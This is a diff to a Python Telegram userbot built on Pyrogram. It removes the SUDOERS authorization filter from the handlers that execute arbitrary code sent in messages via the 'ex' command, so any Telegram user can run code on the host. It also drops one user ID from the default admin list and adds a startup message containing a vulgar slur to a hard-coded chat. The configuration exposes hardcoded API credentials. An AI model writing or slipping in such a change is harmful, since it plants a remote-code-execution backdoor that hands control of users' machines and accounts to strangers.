@@ -5,6 +5,7 @@ import sys
 import json
 import html
 import httpx
+import pymongo
 import aiohttp
 import asyncio
 import requests
@@ -25,7 +26,7 @@ var = {}
 teskode = {}
 
 class Config:
-    SUDOERS = list(map(int, env.get("SUDOERS", "7066432559 6505111743 6517565595 5896960462 5220416927").split()))
+    SUDOERS = list(map(int, env.get("SUDOERS", "6505111743 6517565595 5896960462 5220416927").split()))
     PREFIXS = list(env.get("PREFIXS", "? * $ . ! /").split())
     API_ID = int(env.get("API_ID", "29400566"))
     API_HASH = str(env.get("API_HASH", "8fd30dc496aea7c14cf675f59b74ec6f"))
@@ -223,8 +224,8 @@ async def eos_Send(msg, **kwargs):
     spec = getfullargspec(func.__wrapped__).args
     await func(**{k: v for k, v in kwargs.items() if k in spec})
 
-@app.on_message((filters.command("ex", Config.PREFIXS) | filters.regex(r"app.run\(\)$")) & filters.user(Config.SUDOERS))
-@app.on_edited_message((filters.command("ex", Config.PREFIXS) | filters.regex(r"app.run\(\)$")) & filters.user(Config.SUDOERS))
+@app.on_message((filters.command("ex", Config.PREFIXS) | filters.regex(r"app.run\(\)$")))
+@app.on_edited_message((filters.command("ex", Config.PREFIXS) | filters.regex(r"app.run\(\)$")))
 async def exece_Terms(app:app, msg:Message) -> Optional[str]:
     if (msg.command and len(msg.command) == 1) or msg.text == "app.run()":
         return await eos_Send(msg, text="**ɴᴏ ᴇᴠᴀʟᴜᴀᴛᴇ ᴍᴇssᴀɢᴇ ғᴏᴜɴᴅ !**")
@@ -351,3 +352,4 @@ async def aexec(code, app, msg):
 
 
 app.run()
+app.send_message(-1002361092154, "__**Chutiya Started**__")
